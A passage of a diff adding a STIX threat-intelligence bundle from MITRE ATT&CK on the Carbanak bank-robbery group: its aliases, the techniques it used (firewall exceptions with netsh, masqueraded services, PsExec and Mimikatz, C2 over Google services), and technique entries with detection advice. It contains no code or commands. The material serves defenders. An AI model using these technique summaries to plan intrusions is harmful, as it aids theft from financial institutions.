@@ -1,0 +1,1624 @@
+{
+    "type": "bundle",
+    "id": "bundle--cd49ed78-eba5-4048-8298-e9fa8fe86839",
+    "spec_version": "2.0",
+    "objects": [
+        {"primary_motivation": "personal-gain,Financial gain",
+            "first_seen":"2013",
+            "x_MISP-description": "Groups targeting financial organizations or people with significant financial assets.",
+            "x_MISP-uuid": "00220228-a5a4-4032-a30d-826bb55aa3fb",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "intrusion-set",
+            "name": "Carbanak",
+            "x_mitre_version": "2.0",
+            "modified": "2022-06-11T21:02:30.899Z",
+            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
+            "aliases": [
+                "Carbanak",
+                "Anunak",
+                "Carbon Spider",
+                "Gold Waterfall",
+                "GOLD NIAGARA",
+                "Calcium"
+            ],
+            "id": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) is a cybercriminal group that has used [Carbanak](https://attack.mitre.org/software/S0030) malware to target financial institutions since at least 2013. [Carbanak](https://attack.mitre.org/groups/G0008) may be linked to groups tracked separately as [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN7](https://attack.mitre.org/groups/G0046) that have also used [Carbanak](https://attack.mitre.org/software/S0030) malware.(Citation: Kaspersky Carbanak)(Citation: FireEye FIN7 April 2017)(Citation: Europol Cobalt Mar 2018)(Citation: Secureworks GOLD NIAGARA Threat Profile)(Citation: Secureworks GOLD KINGSWOOD Threat Profile)",
+            "x_mitre_contributors": [
+                "Anastasios Pingios"
+            ],
+            "created": "2017-05-31T21:31:49.021Z",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/groups/G0008",
+                    "external_id": "G0008",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: Kaspersky Carbanak) (Citation: Fox-It Anunak Feb 2015)",
+                    "source_name": "Carbanak"
+                },
+                {
+                    "description": "(Citation: Fox-It Anunak Feb 2015)",
+                    "source_name": "Anunak"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "source_name": "Kaspersky Carbanak"
+                },
+                {
+                    "source_name": "FireEye FIN7 April 2017",
+                    "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+                },
+                {
+                    "url": "https://www.europol.europa.eu/newsroom/news/mastermind-behind-eur-1-billion-cyber-bank-robbery-arrested-in-spain",
+                    "description": "Europol. (2018, March 26). Mastermind Behind EUR 1 Billion Cyber Bank Robbery Arrested in Spain. Retrieved October 10, 2018.",
+                    "source_name": "Europol Cobalt Mar 2018"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-niagara",
+                    "description": "CTU. (n.d.). GOLD NIAGARA. Retrieved September 21, 2021.",
+                    "source_name": "Secureworks GOLD NIAGARA Threat Profile"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-kingswood?filter=item-financial-gain",
+                    "description": "Secureworks. (n.d.). GOLD KINGSWOOD. Retrieved October 18, 2021.",
+                    "source_name": "Secureworks GOLD KINGSWOOD Threat Profile"
+                },
+                {
+                    "url": "https://www.fox-it.com/en/news/blog/anunak-aka-carbanak-update/",
+                    "description": "Prins, R. (2015, February 16). Anunak (aka Carbanak) Update. Retrieved January 20, 2017.",
+                    "source_name": "Fox-It Anunak Feb 2015"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--1ae1ce05-3db2-4a97-8e58-0ed3d65d9d22",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) may use [netsh](https://attack.mitre.org/software/S0108) to add local firewall rule exceptions.(Citation: Group-IB Anunak)",
+            "target_ref": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b",
+            "modified": "2020-03-28T00:22:40.140Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Group-IB Anunak",
+                    "description": "Group-IB and Fox-IT. (2014, December). Anunak: APT against financial institutions. Retrieved April 20, 2016.",
+                    "url": "http://www.group-ib.com/files/Anunak_APT_against_financial_institutions.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--8ab176f0-009f-49e9-ba4b-f476c33697f4",
+            "description": "(Citation: Kaspersky Carbanak)",
+            "target_ref": "malware--72f54d66-675d-4587-9bd3-4ed09f9522e4",
+            "modified": "2019-03-22T19:59:27.077Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--28a4517c-89b9-4744-a58f-6a1f1fec3c33",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) has copied legitimate service names to use for malicious services.(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
+            "modified": "2020-03-17T23:39:44.707Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2020-03-17T23:39:44.707Z",
+            "external_references": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "source_name": "Kaspersky Carbanak"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--539f8bc3-3fb4-43af-8918-9a65239cdff6",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) installs VNC server software that executes through rundll32.(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "modified": "2019-03-22T19:59:27.038Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--58882b0d-0f4a-4e12-b8c1-f43c53fd96f4",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+            "modified": "2019-03-22T19:59:27.004Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.041Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--a732c265-07f0-4e9b-a42c-0df6277e5b27",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.(Citation: Forcepoint Carbanak Google C2)",
+            "target_ref": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
+            "modified": "2020-03-20T21:06:51.449Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Forcepoint Carbanak Google C2",
+                    "description": "Griffin, N. (2017, January 17). CARBANAK GROUP USES GOOGLE FOR MALWARE COMMAND-AND-CONTROL. Retrieved February 15, 2017.",
+                    "url": "https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-and-control"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--aad8c4dc-db11-48b4-b294-f63ccde5e798",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) malware installs itself as a service to provide persistence and SYSTEM privileges.(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
+            "modified": "2019-03-22T19:59:27.002Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--af1514c0-0e58-4878-a409-9804a7ce5e0b",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.(Citation: Group-IB Anunak)",
+            "target_ref": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
+            "modified": "2019-12-27T15:48:40.321Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2018-04-18T17:59:24.739Z",
+            "external_references": [
+                {
+                    "source_name": "Group-IB Anunak",
+                    "description": "Group-IB and Fox-IT. (2014, December). Anunak: APT against financial institutions. Retrieved April 20, 2016.",
+                    "url": "http://www.group-ib.com/files/Anunak_APT_against_financial_institutions.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--bbf116bf-6f8a-44f4-9d98-db6ccbbff333",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) has named malware \"svchost.exe,\" which is the name of the Windows shared service host program.(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
+            "modified": "2020-03-17T23:39:44.725Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--c4bea2b7-e8a2-45d0-bac2-4d82576c1521",
+            "description": "(Citation: Kaspersky Carbanak)",
+            "target_ref": "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60",
+            "modified": "2019-03-22T19:59:27.070Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--d0f797ce-9176-4b74-8d64-fad4e1bdef4f",
+            "description": "(Citation: Kaspersky Carbanak)",
+            "target_ref": "tool--ff6caf67-ea1f-4895-b80e-4bb0fc31c6db",
+            "modified": "2019-03-22T19:59:27.098Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Kaspersky Carbanak",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--e2e2d332-f27b-46fb-b48f-4ee1872b321f",
+            "description": "(Citation: Group-IB Anunak)",
+            "target_ref": "tool--5a63f900-5e7e-4928-a746-dd4558e1df71",
+            "modified": "2019-03-22T19:59:27.071Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2017-05-31T21:33:27.042Z",
+            "external_references": [
+                {
+                    "source_name": "Group-IB Anunak",
+                    "description": "Group-IB and Fox-IT. (2014, December). Anunak: APT against financial institutions. Retrieved April 20, 2016.",
+                    "url": "http://www.group-ib.com/files/Anunak_APT_against_financial_institutions.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--f9b07e52-aff8-4fad-af72-ff646495d25f",
+            "description": "[Carbanak](https://attack.mitre.org/groups/G0008) has obtained and used open-source tools such as [PsExec](https://attack.mitre.org/software/S0029) and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Kaspersky Carbanak)",
+            "target_ref": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
+            "modified": "2021-10-18T21:02:31.520Z",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-10-12T19:38:50.277Z",
+            "external_references": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "source_name": "Kaspersky Carbanak"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-09-16T15:49:58.490Z",
+            "name": "Windows Service",
+            "x_mitre_data_sources": [
+                "Service: Service Creation",
+                "Service: Service Modification",
+                "Process: Process Creation",
+                "Process: OS API Execution",
+                "Command: Command Execution",
+                "Windows Registry: Windows Registry Key Creation",
+                "Windows Registry: Windows Registry Key Modification"
+            ],
+            "x_mitre_version": "1.1",
+            "created": "2020-01-17T19:13:50.402Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "persistence"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "privilege-escalation"
+                }
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
+            "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Matthew Demaske, Adaptforward",
+                "Travis Smith, Tripwire",
+                "Pedro Harrison"
+            ],
+            "x_mitre_effective_permissions": [
+                "Administrator",
+                "SYSTEM"
+            ],
+            "x_mitre_detection": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1543/003",
+                    "external_id": "T1543.003",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/478.html",
+                    "external_id": "CAPEC-478",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/550.html",
+                    "external_id": "CAPEC-550",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/551.html",
+                    "external_id": "CAPEC-551",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "TechNet Services",
+                    "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx"
+                },
+                {
+                    "source_name": "TechNet Autoruns",
+                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
+                },
+                {
+                    "source_name": "Microsoft 4697 APR 2017",
+                    "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
+                    "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697"
+                },
+                {
+                    "source_name": "Microsoft Windows Event Forwarding FEB 2018",
+                    "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
+                    "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Disable or Modify System Firewall",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Windows Registry: Windows Registry Key Modification",
+                "Firewall: Firewall Disable",
+                "Firewall: Firewall Rule Modification"
+            ],
+            "x_mitre_version": "1.0",
+            "modified": "2020-03-29T22:18:11.166Z",
+            "created": "2020-02-21T21:00:48.814Z",
+            "x_mitre_defense_bypassed": [
+                "Firewall"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b",
+            "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_detection": "Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1562/004",
+                    "external_id": "T1562.004",
+                    "source_name": "mitre-attack"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Masquerade Task or Service",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Service: Service Metadata",
+                "Service: Service Creation",
+                "Scheduled Job: Scheduled Job Metadata",
+                "Scheduled Job: Scheduled Job Modification"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-18T13:24:52.618Z",
+            "created": "2020-02-10T20:30:07.426Z",
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator",
+                "SYSTEM"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "Linux",
+                "macOS"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
+            "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_detection": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1036/004",
+                    "external_id": "T1036.004",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "TechNet Schtasks",
+                    "description": "Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/library/bb490996.aspx"
+                },
+                {
+                    "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html",
+                    "description": "Freedesktop.org. (n.d.). systemd.service \u2014 Service unit configuration. Retrieved March 16, 2020.",
+                    "source_name": "Systemd Service Units"
+                },
+                {
+                    "source_name": "Palo Alto Shamoon Nov 2016",
+                    "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
+                    "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/"
+                },
+                {
+                    "source_name": "Fysbis Dr Web Analysis",
+                    "description": "Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.",
+                    "url": "https://vms.drweb.com/virus/?i=4276269"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-04-20T19:23:37.762Z",
+            "name": "Match Legitimate Name or Location",
+            "x_mitre_data_sources": [
+                "Image: Image Metadata",
+                "File: File Metadata",
+                "Process: Process Metadata"
+            ],
+            "x_mitre_version": "1.1",
+            "created": "2020-02-10T20:43:10.239Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_defense_bypassed": [
+                "Application control by file name or path"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Containers"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
+            "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Yossi Weizman, Azure Defender Research Team",
+                "Vishwas Manral, McAfee"
+            ],
